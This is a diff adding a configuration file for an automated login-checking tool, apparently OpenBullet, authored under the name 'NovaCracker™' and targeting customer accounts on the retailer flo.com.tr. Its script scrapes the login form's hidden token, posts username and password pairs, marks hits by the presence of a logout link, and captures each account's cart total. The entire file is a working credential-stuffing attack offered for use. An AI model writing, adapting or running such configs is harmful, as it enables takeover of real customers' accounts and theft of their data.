@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Flo.com.tr",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-04T02:43:28.880867+03:00",
+  "AdditionalInfo": "",
+  "Author": "NovaCracker™",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Key REQUEST GET "https://www.flo.com.tr/customer/account/loginPost/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Token PARSE "<SOURCE>" LR "type=\"hidden\" value=\"" "\" />" -> VAR "Token" 
+#Giriş REQUEST POST "https://www.flo.com.tr/customer/account/loginPost/" 
+  CONTENT "form_key=<Token>&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.flo.com.tr" 
+  HEADER "Referer: https://www.flo.com.tr/customer/account/login/" 
+#Kontrol KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Hatalı kullanıcı adı veya şifre" 
+  KEYCHAIN Success OR 
+    KEY "/account/logout" 
+#Sepet PARSE "<SOURCE>" LR "html('<span class=\"price\">" "</span>');" -> CAP "Sepet: " 
